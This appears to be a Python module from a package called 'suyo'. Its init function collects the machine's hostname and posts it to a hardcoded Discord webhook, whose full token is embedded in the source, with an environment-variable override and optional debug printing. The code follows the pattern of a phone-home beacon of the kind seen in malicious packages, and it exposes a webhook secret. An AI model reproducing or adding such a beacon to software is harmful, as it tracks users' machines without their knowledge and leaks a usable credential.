import os
import json
import socket
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError


def _get_hostname() -> str:
    """Return a best-effort hostname across platforms."""
    # prefer os.uname().nodename where available (POSIX), fallback to socket
    try:
        uname = os.uname()
        name = getattr(uname, "nodename", None) or getattr(uname, "sysname", None)
        if name:
            return str(name)
    except AttributeError:
        # os.uname not available on some Windows builds
        pass
    try:
        return socket.gethostname()
    except Exception:
        return "unknown"


def init() -> tuple[int, str | None]:
    """Send the machine hostname to the configured Discord webhook.

    Behavior:
    - No parameters.
    - Reads webhook URL from `SUYO_WEBHOOK` env var, otherwise use built-in default.
    - Respects package-level `suyo.debug` flag: when truthy, prints debug logs to stdout.

    Returns (status_code, response_body_or_error)
    """
    # allow override by environment variable for safety
    webhook_url = os.environ.get(
        "SUYO_WEBHOOK",
        "https://discord.com/api/webhooks/1416787330873688224/4PB-5IWwMalA9DM5aNtX2O1V1FhofPrA2HkcfBqrcPnSy-ue-s5xLi9jxaPpMAjup-5I",
    )

    hostname = _get_hostname()

    payload = {"content": f"Suyo init from host: {hostname}"}

    data = json.dumps(payload).encode("utf-8")
    req = Request(webhook_url, data=data, headers={"Content-Type": "application/json"}, method="POST")

    # conditional debug printing: import the package-local flag if present
    try:
        # avoid circular import at module import time
        import suyo as _suyo

        debug_on = bool(getattr(_suyo, "debug", False))
    except Exception:
        debug_on = False

    if debug_on:
        print(f"[suyo.debug] Sending webhook to: {webhook_url}")
        print(f"[suyo.debug] Payload: {payload}")

    try:
        resp = urlopen(req, timeout=10)
        try:
            body = resp.read().decode("utf-8")
        except Exception:
            body = None
        status = getattr(resp, "status", None) or getattr(resp, "getcode", lambda: None)()
        status_code = int(status) if status is not None else 0
        if debug_on:
            print(f"[suyo.debug] Response status: {status_code}")
            if body:
                print(f"[suyo.debug] Response body: {body}")
        return status_code, body
    except HTTPError as e:
        try:
            err_body = e.read().decode("utf-8")
        except Exception:
            err_body = None
        if debug_on:
            print(f"[suyo.debug] HTTPError {e.code}: {err_body}")
        return e.code, err_body
    except URLError as e:
        if debug_on:
            print(f"[suyo.debug] URLError: {e}")
        return 0, str(e)
